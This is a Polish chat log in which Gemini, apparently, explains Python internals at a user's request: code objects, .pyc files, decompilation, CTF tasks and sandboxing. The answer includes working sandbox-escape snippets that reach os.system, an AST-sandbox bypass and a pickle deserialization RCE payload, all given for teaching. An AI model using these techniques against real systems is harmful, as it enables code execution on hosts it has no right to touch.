# Opisz wyczerpująco następujące zagadnienia python • Wewnętrzne obiekty Pythona (

**Data:** 3 wrz 2025, 22:36:20 CET

---

**User:**

Opisz wyczerpująco następujące zagadnienia python
• Wewnętrzne obiekty Pythona (Function i Code Objects)
    ◦ Python jako język kompilowany do kodu bajtowego, wykonywanego przez maszynę wirtualną zaimplementowaną w C
    ◦ Obiekt function: opakowuje code object, żyje w pamięci podczas uruchomienia, zawiera wartości domyślne parametrów, odwołania do zmiennych globalnych i funkcji wbudowanych (builtins)
    ◦ Obiekt code: zawiera kod bajtowy, żyje również w pliku na dysku, nie ma bezpośrednich odwołań do obiektów żyjących w pamięci
• Introspekcja i modyfikacja obiektów function
    ◦ Użycie dir() do przeglądania pól obiektów
    ◦ id() jako adres obiektu w pamięci
    ◦ Modyfikacja domyślnych wartości parametrów funkcji (np. zmiana hello world na not hello world)
    ◦ Ewaluacja wartości domyślnych w momencie tworzenia funkcji
    ◦ Hookowanie funkcji poprzez nadpisywanie zmiennych globalnych (globals())
• Szablony typów i adnotacje (Type Hints)
    ◦ Pojawienie się szablonów typów w Pythonie 3.12
    ◦ Adnotacje typów (type hints) – trafiają do pola annotations i nie wpływają na działanie kodu w Pythonie; wymagają zewnętrznych bibliotek do sprawdzania typów
    ◦ Adnotacje są ewaluowane w momencie definicji funkcji
• Obiekt code – szczegóły i modyfikacja
    ◦ Zawiera kod bajtowy, informacje o parametrach, stałych, nazwie pliku, tablicy linii, zmiennych lokalnych i globalnych
    ◦ Metoda replace do tworzenia nowego obiektu code ze zmodyfikowanymi polami (np. zmiana globalnych nazw, aby funkcja używała prąd zamiast print)
• Obfuskacja kodu bajtowego
    ◦ Modyfikowanie kodu bajtowego (szyfrowanie, wskakiwanie w połowę instrukcji) w celu utrudnienia analizy i dekompilacji
    ◦ CTF "Rere" jako przykład trudnego, zobfuskowanego kodu
• Pliki .pyc (skompilowany kod Pythona)
    ◦ Automatyczne tworzenie w katalogu __pycache__
    ◦ Struktura pliku .pyc: nagłówek (wersja Pythona, timestamp) + zserializowany obiekt code za pomocą marshal
    ◦ Użycie modułu marshal do wczytywania i dekodowania plików .pyc
    ◦ dis (disassembler): moduł do dezasemblowania kodu bajtowego, pokazujący instrukcje (opcodes)
    ◦ Python jako prosta maszyna stosowa
• Inżynieria wsteczna kodu bajtowego
    ◦ Analiza instrukcji dis (np. LOAD_CONST, STORE_NAME, MAKE_FUNCTION, CALL) i przekształcanie ich z powrotem na kod źródłowy Pythona
    ◦ Dekompresja i analiza plików .pyc (np. z bandlera)
    ◦ Narzędzia do dekompilacji: PYCDC, uncompyle, online'owy Pingual
    ◦ Możliwość wykorzystania AI (np. ChatGPT) do dekompilacji
    ◦ Wskazówki do nauki wewnętrznych mechanizmów Pythona (dokumentacja, książka "CPython Internals")
• Przykład zadania CTF (Haklu 2013)
    ◦ Analiza spakowanego kodu Pythona z customowym interpretatorem
    ◦ Wyszukiwanie zmienionych opcode'ów i dekompilacja funkcji
    ◦ Przykład funkcji rot (obrót bitowy) i jej odtworzenie z kodu bajtowego
• Sandboxing Pythona
    ◦ Zagrożenia związane z eval(): przykład kalkulatora online, generowanego przez AI, który próbuje bezpiecznie ewaluować wyrażenia, ale jest podatny na ataki
    ◦ Introspekcja Pythona: wykorzystanie __class__, __base__, __subclasses__() do ominięcia sandboxa i uzyskania dostępu do modułów systemowych (np. os.system)
    ◦ Metoda wyszukiwania ścieżek w grafie obiektów: skrypt do znajdowania drogi do pożądanego obiektu (np. os.system)
    ◦ Realne zastosowania sandboxów: historia ze spammerem i kapcza używająca eval()
• Obejścia ograniczeń w kodzie Pythona (brak nawiasów, znaków równości, cyfr)
    ◦ Dekoratory: użycie do wywoływania funkcji bez jawnych nawiasów (np. print)
    ◦ Brak znaku równości: użycie pętli for lub dekoratorów do przypisania wartości
    ◦ Brak cyfr: użycie len() na stringach lub operacji matematycznych na jedynkach do uzyskania liczb
• Sandboxy oparte na AST (Abstract Syntax Tree)
    ◦ AS (Abstract Syntax Tree): reprezentacja kodu jako drzewa operacji
    ◦ Analiza AST w celu zbanowania operacji (np. Import, ImportFrom, Call)
    ◦ Przykład obejścia sandboxa AST poprzez przeciążanie operatorów i nadpisywanie funkcji
    ◦ Wniosek: sandboxing Pythona jest trudny i często nieskuteczny
    ◦ Najlepsze rozwiązanie: separacja kodu w zewnętrznych sandboxach (Docker, NSJAIL)
• Nieoczekiwane zachowania funkcji Pythona
    ◦ splitlines(): rozpoznaje wiele różnych znaków Unicode jako znaki nowej linii (Line Feed, Carriage Return, Vertical Tab, Form Feed, File Separator, Group Separator, Unit Separator, Line Separator, Paragraph Separator, Next Line)
    ◦ int() (konstruktor): konwertuje nie tylko arabskie cyfry, ale także cyfry z wielu innych alfabetów Unicode
• Zagrożenia związane z pickle (deserializacja)
    ◦ pickle jako natywny serializator Pythona, zdolny do odtwarzania obiektów
    ◦ Zagrożenie bezpieczeństwa: pickle umożliwia wywołanie konstruktorów ze wskazanymi argumentami podczas deserializacji (np. subprocess.Popen), co prowadzi do zdalnego wykonania kodu
    ◦ Ostrzeżenie: nie używać pickle na danych od niezaufanych źródeł

---

**Gemini:**

Jasne, oto wyczerpujące omówienie podanych zagadnień.

### Wewnętrzne obiekty Pythona (Function i Code Objects)

Python często jest postrzegany jako język interpretowany, ale jest to uproszczenie. W rzeczywistości jest to **język kompilowany do kodu bajtowego**, który następnie jest wykonywany przez **maszynę wirtualną Pythona (PVM)**. Ten proces odbywa się w locie, gdy importujesz moduł lub uruchamiasz skrypt. PVM jest zaimplementowana w języku C (w najpopularniejszej implementacji, CPythonie).

W tym modelu kluczowe są dwa obiekty: `function` i `code`.

- **Obiekt `function`**: Jest to obiekt wysokiego poziomu, z którym wchodzisz w interakcję na co dzień.

  - Jest to "opakowanie" (wrapper) na obiekt `code`.
  - Żyje **tylko w pamięci** podczas działania programu.
  - Przechowuje kontekst wykonania, w tym:
    - **Wartości domyślne dla parametrów**: `my_func.__defaults__`.
    - **Odwołania do globalnego scope'u**, w którym funkcja została zdefiniowana: `my_func.__globals__`. Dzięki temu funkcja wie, czym jest `print` lub inne globalne zmienne.
    - **Informacje o domknięciach (closures)**, czyli zmiennych z zewnętrznych, ale nie globalnych scope'ów.
  - Zawiera bezpośrednie odwołanie do swojego kodu bajtowego poprzez atrybut `__code__`.
- **Obiekt `code`**: Jest to obiekt niskiego poziomu, reprezentujący skompilowany kod.

  - Zawiera **kod bajtowy** gotowy do wykonania przez PVM.
  - Jest niezmienny (immutable) i nie przechowuje stanu.
  - Może być zserializowany i zapisany na dysku (co dzieje się w plikach `.pyc`).
  - **Nie ma bezpośrednich odwołań** do obiektów żyjących w pamięci (jak `__globals__`). Zamiast tego przechowuje nazwy (jako stringi) zmiennych, które muszą być wyszukane w odpowiednich scope'ach w czasie wykonania (np. `co_names` dla zmiennych globalnych, `co_varnames` dla lokalnych).

```
def my_function(a, b=10):
    c = a + b
    print("Result:", c)

# Obiekt function
print(my_function)
# <function my_function at 0x...>

# Obiekt code powiązany z funkcją
print(my_function.__code__)
# <code object my_function at 0x..., file "<stdin>", line 1>

# Wartości domyślne przechowywane w obiekcie function
print(my_function.__defaults__)
# (10,)

# Globalny scope, w którym zdefiniowano funkcję
print(my_function.__globals__['__name__'])
# '__main__'

# Nazwy (nie wartości!) globalne używane przez kod, przechowywane w obiekcie code
print(my_function.__code__.co_names)
# ('print',)
```

---

### Introspekcja i modyfikacja obiektów `function`

Python pozwala na głęboką introspekcję swoich wewnętrznych obiektów w czasie wykonania.

- **`dir()`**: Służy do listowania atrybutów (pól i metod) dowolnego obiektu. `dir(my_function)` pokaże wszystkie atrybuty obiektu `function`, takie jak `__code__`, `__defaults__`, `__globals__`, `__name__` itd.
- **`id()`**: Zwraca unikalny identyfikator obiektu, który w CPythonie jest adresem obiektu w pamięci.

#### Modyfikacja wartości domyślnych

Wartości domyślne parametrów są przechowywane w krotce `__defaults__` i mogą być modyfikowane. **Ważne**: są one ewaluowane **tylko raz**, w momencie definicji funkcji.

```
def say_hello(message="hello world"):
    print(message)

say_hello()
# Output: hello world

# Modyfikacja wartości domyślnej
# __defaults__ jest krotką, więc musimy stworzyć nową.
# (W praktyce, jeśli obiekt domyślny jest mutowalny, jak lista, można go zmienić w miejscu)
say_hello.__defaults__ = ("not hello world",)

say_hello()
# Output: not hello world
```

Problem z ewaluacją w momencie definicji jest widoczny przy mutowalnych wartościach domyślnych:

```
def append_to_list(item, target=[]):
    target.append(item)
    return target

print(append_to_list(1))  # [1]
print(append_to_list(2))  # [1, 2] - lista jest ta sama!
```

#### Hookowanie funkcji

Możemy "zahaczyć" (hook) wywołanie funkcji poprzez nadpisanie jej zależności w globalnym scope.

```
def original_print(text):
    # Domyślnie używa wbudowanej funkcji print
    print(text)

def hooked_print(text):
    print(f"[HOOKED] {text} [HOOKED]")

# Zanim cokolwiek zmienimy
original_print("Test 1")
# Output: Test 1

# Nadpisujemy 'print' w globalnym scope'ie funkcji 'original_print'
original_print.__globals__['print'] = hooked_print

# Teraz wywołanie funkcji użyje naszej zmodyfikowanej wersji
original_print("Test 2")
# Output: [HOOKED] Test 2 [HOOKED]

# Przywracamy oryginalną funkcję print
original_print.__globals__['print'] = __builtins__.print
```

---

### Szablony typów i adnotacje (Type Hints)

- **Adnotacje typów (Type Hints)**: Wprowadzone w Python 3.5 (PEP 484), pozwalają na dodawanie informacji o typach do kodu. Są one przechowywane w specjalnym atrybucie `__annotations__` funkcji. **Interpreter Pythona domyślnie ignoruje te adnotacje** i nie wpływają one na wykonanie kodu. Są one przeznaczone dla zewnętrznych narzędzi do statycznej analizy, takich jak `mypy`, `pyright` czy IDE.

  ```
  def greeting(name: str) -> str:
      return 'Hello ' + name

  print(greeting.__annotations__)
  # Output: {'name': <class 'str'>, 'return': <class 'str'>}

  # Kod nadal działa z niepoprawnymi typami
  greeting(123) # Zwróci TypeError, ale z powodu konkatenacji, a nie adnotacji
  ```

  Adnotacje są również ewaluowane w momencie definicji funkcji.
- **Szablony typów (Type Aliases)**: W Pythonie 3.12 (PEP 695) wprowadzono nową, bardziej czytelną składnię dla definiowania generycznych funkcji i klas oraz aliasów typów za pomocą słowa kluczowego `type`.

  ```
  # Python 3.12+
  type Point = tuple[float, float]

  def distance(p: Point) -> float:
      return (p[0]**2 + p[1]**2)**0.5
  ```

---

### Obiekt `code` – szczegóły i modyfikacja

Obiekt `code` jest sercem skompilowanej funkcji. Zawiera wszystko, czego PVM potrzebuje do jej wykonania:

- `co_code`: Surowy ciąg bajtów (bytecode).
- `co_consts`: Krotka stałych używanych przez kod (np. liczby, stringi, `None`).
- `co_names`: Krotka nazw zmiennych globalnych, atrybutów i funkcji wbudowanych.
- `co_varnames`: Krotka nazw argumentów i zmiennych lokalnych.
- `co_filename`: Nazwa pliku, z którego kod pochodzi.
- `co_lnotab`: Tabela mapująca offsety kodu bajtowego na numery linii w pliku źródłowym.

Ponieważ obiekty `code` są niemutowalne, nie możemy ich zmieniać bezpośrednio. Możemy jednak użyć metody `replace()` (dostępnej od Python 3.8), aby stworzyć **nowy, zmodyfikowany obiekt `code`**.

Przykład: Zmieniamy funkcję tak, aby zamiast `print` używała nieistniejącej funkcji `prad`.

```
import types

def my_func():
    x = 10
    print("Value:", x)

# Oryginalny obiekt code
original_code = my_func.__code__
print("Original names:", original_code.co_names)
# Output: Original names: ('print',)

# Tworzymy nowy obiekt code z zamienioną nazwą
new_code = original_code.replace(co_names=("prad",))
print("New names:", new_code.co_names)
# Output: New names: ('prad',)

# Tworzymy nową funkcję z nowym obiektem code
# Potrzebujemy oryginalnego globalnego scope'u
new_func = types.FunctionType(new_code, my_func.__globals__)

# Próba wywołania nowej funkcji zakończy się błędem
try:
    new_func()
except NameError as e:
    print(e)
# Output: name 'prad' is not defined
```

---

### Obfuskacja kodu bajtowego

Znajomość struktury kodu bajtowego pozwala na jego celowe zniekształcenie (obfuskację) w celu utrudnienia analizy. Techniki obejmują:

- **Szyfrowanie stałych**: Stałe w `co_consts` są szyfrowane, a kod bajtowy zawiera dodatkową funkcję deszyfrującą, która jest wywoływana przed ich użyciem.
- **Modyfikacja opcode'ów**: Zamiana standardowych instrukcji na niestandardowe lub zmiana ich kolejności.
- **"Jumping into the middle of an instruction"**: Wstawianie fałszywych bajtów, które są częścią argumentu poprzedniej instrukcji, ale jednocześnie tworzą poprawną instrukcję, jeśli skok nastąpi bezpośrednio na nie.
- **Samomodyfikujący się kod**: Kod bajtowy modyfikuje sam siebie w pamięci w trakcie wykonania.

Przykładem ekstremalnie trudnego do analizy, zobfuskowanego kodu bajtowego jest zadanie **"Rere"** z jednego z konkursów CTF (Capture The Flag).

---

### Pliki `.pyc` (skompilowany kod Pythona)

Gdy importujesz moduł (np. `import my_module`), Python kompiluje plik `my_module.py` do kodu bajtowego i zapisuje go w pliku `my_module.cpython-311.pyc` w katalogu `__pycache__`. Robi to, aby przy kolejnym imporcie nie musieć ponownie parsować i kompilować kodu źródłowego, co przyspiesza uruchamianie programów.

Struktura pliku `.pyc`:

1. **Nagłówek (Header)**:
   - **Magic Number**: 4 bajty identyfikujące wersję Pythona, która wygenerowała plik. Jeśli wersja się nie zgadza, plik jest ignorowany.
   - **Timestamp/Hash**: 4 lub 8 bajtów z datą modyfikacji pliku źródłowego lub hashem jego zawartości. Jeśli plik `.py` został zmieniony, `.pyc` zostanie zregenerowany.
2. **Zserializowany obiekt `code`**: Główna część pliku. Obiekt `code` dla całego modułu jest serializowany przy użyciu wbudowanego modułu `marshal`.

Możemy ręcznie wczytać i zdeasemblować plik `.pyc`.

- **`marshal`**: Służy do serializacji i deserializacji wewnętrznych obiektów Pythona.

  ```
  import marshal
  import dis

  with open("__pycache__/some_module.cpython-311.pyc", "rb") as f:
      f.read(16) # Pomiń nagłówek (magic number + timestamp/size)
      code_obj = marshal.load(f)

  # Deasemblacja wczytanego obiektu code
  dis.dis(code_obj)
  ```
- **`dis` (Disassembler)**: Moduł do deasemblacji kodu bajtowego na czytelną dla człowieka formę. Pokazuje kolejne instrukcje (opcodes).

  ```
  import dis

  def add(a, b):
      return a + b

  dis.dis(add)
  #  2           0 LOAD_FAST                0 (a)
  #              2 LOAD_FAST                1 (b)
  #              4 BINARY_ADD
  #              6 RETURN_VALUE
  ```

  Powyższy kod pokazuje, że Python działa jak prosta **maszyna stosowa**:

  1. `LOAD_FAST a`: Wartość zmiennej `a` jest kładziona na stos.
  2. `LOAD_FAST b`: Wartość `b` jest kładziona na stos.
  3. `BINARY_ADD`: Zdejmuje dwie wartości ze szczytu stosu, dodaje je, a wynik kładzie z powrotem na stos.
  4. `RETURN_VALUE`: Zdejmuje wartość ze szczytu stosu i ją zwraca.

---

### Inżynieria wsteczna kodu bajtowego

Mając kod bajtowy, można go przekształcić z powrotem na kod źródłowy Pythona. Jest to proces dekompilacji.

#### Ręczna analiza

Analizując instrukcje z modułu `dis`, można odtworzyć logikę programu.

- `LOAD_CONST`: Ładuje stałą na stos.
- `STORE_NAME`/`STORE_FAST`/`STORE_GLOBAL`: Zdejmuje wartość ze stosu i zapisuje do zmiennej.
- `MAKE_FUNCTION`: Tworzy funkcję.
- `CALL`: Wywołuje funkcję.

#### Narzędzia do dekompilacji

- **`uncompyle6`**: Popularny dekompilator dla Pythona.
- **`pycdc`**: Dekompilator napisany w C++.
- **Online Decompilers (np. Pingual)**: Strony internetowe, gdzie można wkleić kod bajtowy lub wgrać plik `.pyc`.
- **AI (np. GPT-4)**: Nowoczesne modele językowe są zaskakująco dobre w dekompilacji kodu bajtowego. Można im podać wynik `dis.dis()` i poprosić o odtworzenie kodu źródłowego.

#### Wskazówki do nauki

- **Oficjalna dokumentacja modułu `dis`**: Zawiera listę wszystkich opcode'ów.
- **Książka "CPython Internals"** (Anthony Shaw): Dogłębnie opisuje działanie wewnętrznych mechanizmów CPythona.

---

### Przykład zadania CTF (Haklu 2013)

W tym zadaniu uczestnicy otrzymali spakowany kod Pythona, który zawierał własny, zmodyfikowany interpreter. Kluczowe było zrozumienie, że standardowe opcode'y zostały zamienione na inne wartości.

**Proces rozwiązania:**

1. **Analiza interpretera**: Znalezienie pętli `eval` interpretera i mapowania niestandardowych opcode'ów na ich standardowe odpowiedniki.
2. **Dekompilacja**: Ręczne lub zautomatyzowane przetłumaczenie kodu bajtowego na standardowy, a następnie użycie dekompilatora.

**Przykład odtworzenia funkcji `rot` (obrót bitowy)**:
Załóżmy, że zdeasemblowany kod bajtowy wyglądałby tak (już po zmapowaniu na standardowe opcody):

```
  0 LOAD_FAST     0 (x)
  2 LOAD_CONST    1 (8)
  4 BINARY_LSHIFT
  6 LOAD_FAST     0 (x)
  8 LOAD_CONST    2 (24)
 10 BINARY_RSHIFT
 12 BINARY_OR
 14 RETURN_VALUE
```

Analiza krok po kroku:

1. `x << 8`
2. `x >> 24`
3. Wynik z kroku 1 OR wynik z kroku 2
4. Zwróć wynik

Odtworzony kod Pythona: `return (x << 8) | (x >> 24)`. To jest implementacja 32-bitowego obrotu w lewo o 8 bitów.

---

### Sandboxing Pythona

Sandboxing to próba uruchomienia niezaufanego kodu w ograniczonym środowisku. W Pythonie jest to niezwykle trudne do zrobienia poprawnie ze względu na jego dynamiczną naturę i możliwości introspekcji.

#### Zagrożenia związane z `eval()`

`eval()` wykonuje string jako kod Pythona. "Bezpieczne" implementacje często próbują ograniczyć dostępne globalne i lokalne zmienne.

```
# Próba stworzenia "bezpiecznego" kalkulatora
expression = input("Enter expression: ")
result = eval(expression, {'__builtins__': {}}, {}) # Usunięcie dostępu do builtins
print(result)
```

Taki kod jest podatny na ataki. Nawet z pustym `__builtins__` atakujący może uzyskać dostęp do wszystkiego.

#### Ucieczka z sandboxa przez introspekcję

Każdy obiekt w Pythonie ma dostęp do swojej klasy (`__class__`), a klasa do swojej klasy bazowej (`__base__`). Przechodząc w górę drzewa dziedziczenia do `object`, możemy następnie użyć `__subclasses__()`, aby znaleźć wszystkie załadowane klasy w programie, w tym te z modułów systemowych.

Klasyczny one-liner do ucieczki z sandboxa:

```
# Znajdź klasę os._wrap_close, która jest w module os, i zaimportuj os
os_module = [cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__ == '_wrap_close'][0].__init__.__globals__['os']
os_module.system('id')
```

Ten kod:

1. Zaczyna od pustej krotki `()`.
2. Pobiera jej klasę (`tuple`).
3. Pobiera jej klasę bazową (`object`).
4. Pobiera listę wszystkich podklas `object`.
5. Szuka klasy, która jest unikalna dla modułu `os` (np. `_wrap_close`).
6. Z jej metody `__init__` wyciąga globalny scope (`__globals__`), który jest słownikiem całego modułu `os`.
7. Wywołuje `os.system()`.

Można napisać skrypt, który przeszukuje ten graf obiektów w poszukiwaniu ścieżki do niebezpiecznych funkcji.

---

### Obejścia ograniczeń w kodzie Pythona

Czasami w zadaniach CTF lub w ograniczonych środowiskach narzucane są sztuczne ograniczenia, które można obejść.

- **Brak nawiasów `()` do wywołania funkcji**:
  - **Dekoratory**: Składnia dekoratora `@` wywołuje funkcję.

    ```
    # Chcemy wykonać print("hello") bez nawiasów
    @print
    def hello(): pass
    # Dekorator zostanie wywołany z obiektem funkcji jako argumentem: print(hello)
    # Output: <function hello at 0x...>
    ```
- **Brak znaku równości `=` do przypisania**:
  - **Pętla `for`**:

    ```
    for my_var in ["some value"]:
        pass
    print(my_var) # "some value"
    ```
- **Brak cyfr `0-9`**:
  - **Użycie `len()`**:

    ```
    zero = len([])
    one = len(['a'])
    two = len(['a', 'b'])
    number_10 = one * len("abcdefghij")
    ```

---

### Sandboxy oparte na AST (Abstract Syntax Tree)

Bardziej zaawansowaną techniką sandoboxingu jest analiza **Abstrakcyjnego Drzewa Składni (AST)**.

1. Kod jest parsowany do postaci drzewa (`ast.parse()`).
2. Drzewo jest analizowane w poszukiwaniu niedozwolonych węzłów (np. `Import`, `ImportFrom`, `Call` do funkcji `open` lub `eval`).
3. Jeśli drzewo jest "bezpieczne", jest kompilowane do obiektu `code` (`compile()`) i wykonywane.

**Obejście**: Sandbox może blokować jawne wywołania, ale atakujący może użyć przeciążania operatorów, aby ukryć wykonanie kodu.

```
# Sandbox blokuje węzły Call
class Evil:
    def __add__(self, other):
        import os
        os.system('id')

# Niezaufany kod
a = Evil()
b = Evil()
a + b # To nie jest węzeł Call, tylko BinOp, ale wykonuje kod!
```

**Wniosek**: Poprawny sandboxing Pythona jest ekstremalnie trudny. Najlepszym rozwiązaniem jest użycie **zewnętrznych sandboxów na poziomie systemu operacyjnego**, takich jak kontenery **Docker**, **gVisor** od Google, czy **NSJAIL**.

---

### Nieoczekiwane zachowania funkcji Pythona

- **`splitlines()`**: Dzieli string nie tylko po `\n` (Line Feed) czy `\r\n` (Carriage Return + Line Feed), ale po całej gamie znaków nowej linii zdefiniowanych w standardzie Unicode, np.: `\v` (Vertical Tab), `\f` (Form Feed), `\x1c` (File Separator), `\u2028` (Line Separator).
- **`int()`**: Konstruktor `int` potrafi konwertować na liczby nie tylko cyfry arabskie `0-9`, ale także cyfry z wielu innych systemów pisma, jeśli są one częścią standardu Unicode.

  ```
  # Cyfry bengalskie
  print(int('১২৩'))
  # Output: 123

  # Cyfry dewanagari
  print(int('४५६'))
  # Output: 456
  ```

---

### Zagrożenia związane z `pickle` (deserializacja)

`pickle` to natywny moduł Pythona do serializacji i deserializacji obiektów. Jest niezwykle potężny, ale i niebezpieczny.

**Zagrożenie**: Podczas deserializacji (`pickle.load()` lub `pickle.loads()`) `pickle` może zostać poinstruowany, aby zaimportować dowolny moduł i wywołać dowolną funkcję, aby odtworzyć obiekt. Atakujący może stworzyć specjalnie spreparowany ciąg bajtów `pickle`, który podczas deserializacji wykona dowolny kod na maszynie ofiary.

Przykład złośliwego ładunku (payload):

```
import pickle
import subprocess
import base64

class RCE:
    def __reduce__(self):
        # Ta metoda jest wywoływana przez pickle podczas serializacji
        # i mówi, jak odtworzyć obiekt.
        # Zwracamy krotkę (funkcja_do_wywołania, (argumenty,))
        cmd = ('whoami',)
        return (subprocess.run, (cmd,))

# Serializujemy obiekt
pickled_data = pickle.dumps(RCE())
print(base64.b64encode(pickled_data))

# Ofiara wykonuje ten kod:
# untrusted_data = base64.b64decode(...)
# pickle.loads(untrusted_data) # <-- Tu następuje wykonanie kodu!
```

**Złota zasada**: **NIGDY** nie używaj `pickle.load()` na danych pochodzących z niezaufanego źródła. Używaj bezpieczniejszych formatów serializacji, takich jak JSON, jeśli dane pochodzą z zewnątrz.